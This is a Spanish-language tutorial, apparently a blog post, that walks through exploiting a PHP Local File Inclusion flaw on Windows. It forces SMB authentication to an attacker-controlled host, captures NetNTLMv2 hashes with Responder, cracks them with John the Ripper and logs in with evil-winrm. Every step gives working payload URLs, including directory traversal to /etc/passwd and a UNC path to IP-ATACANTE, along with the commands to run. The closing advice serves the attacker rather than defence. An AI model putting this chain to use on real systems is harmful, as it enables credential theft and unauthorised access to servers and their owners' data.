🕵️ Explotación LFI + SMB y Captura de Hashes NTLMv2
¡Aquí te explico cómo detectar y explotar una vulnerabilidad LFI para robar hashes NTLMv2 de un sistema Windows!

1. 🔍 Detectar LFI (Local File Inclusion)
Primero, busca parámetros en una web que incluyan archivos de forma dinámica, como este:

http://target.com/index.php?page=home.html

Ahora, intenta incluir archivos locales usando ../ (directory traversal):

En Linux: http://target.com/index.php?page=../../../../etc/passwd 🐧

En Windows: http://target.com/index.php?page=../../../../windows/system32/drivers/etc/hosts 💻

Si ves el contenido del archivo, ¡la máquina es vulnerable! Confirma con otros archivos como config.php o C:\Windows\win.ini.

2. 💡 Entendiendo include() en PHP
La función include() ejecuta el archivo que le pasas. Si el parámetro vulnerable no tiene filtros, puedes controlar qué archivo se incluye. Esto te permite leer archivos o, en ataques más avanzados, conseguir RCE (Remote Code Execution).

3. 🎣 LFI → Captura de Hashes NTLMv2 vía SMB
En sistemas Windows, puedes forzar al servidor a autenticarse hacia tu máquina atacante usando una ruta SMB como esta:

\\IP-ATACANTE\share\archivo

Cuando Windows intente acceder a esa ruta, enviará un NetNTLMv2 hash con sus credenciales. Un servidor SMB malicioso puede capturarlo.

4. 🛠️ Preparar la Máquina Atacante
Configura Responder en tu máquina atacante para capturar los hashes.

Abre una terminal y ejecuta: sudo responder -I <INTERFAZ>

<INTERFAZ> es la interfaz que conecta con la víctima (usa ifconfig para revisarla).

Esto levantará un servidor SMB falso. Ahora, solo tienes que modificar el parámetro LFI para que apunte a tu servidor:

http://target.com/index.php?page=\\IP-ATACANTE\share\archivo

Nota: A veces necesitarás usar doble barra, así: http://target.com/index.php?page=//IP-ATACANTE/share/archivo

5. 🎯 Resultado Esperado
La víctima intentará acceder a tu recurso SMB, y Responder capturará el hash automáticamente, mostrando algo así en pantalla:

Administrator::VICTIMA:1122334455667788:HASH_NETNTLMv2

6. 🔓 Guardar y Crackear el Hash
Copia el hash capturado a un archivo de texto (por ejemplo, hashes.txt) y usa una herramienta como John The Ripper para crackearlo.

john -w=/usr/share/wordlists/rockyou.txt hashes.txt

¡John probará contraseñas de la wordlist hasta encontrar la correcta! También puedes usar Hashcat si prefieres usar la GPU.

7. 🔑 Uso de las Credenciales Obtenidas
Una vez crackeado el hash, obtendrás la contraseña de un usuario, como Administrator. Puedes usarla para acceder a servicios remotos:

WinRM: evil-winrm -i <IP> -u <usuario> -p <password>

También puedes probar SMB, RDP u otros servicios si están expuestos.

8. 🛡️ Recomendaciones y Buenas Prácticas
Este método funciona solo en Windows cuando LFI permite rutas SMB.

Documenta todo: la URL vulnerable, los parámetros que probaste, el hash que capturaste y las herramientas que usaste.

Nunca dependas de nombres de archivo específicos.

Mantén tu máquina atacante siempre lista.
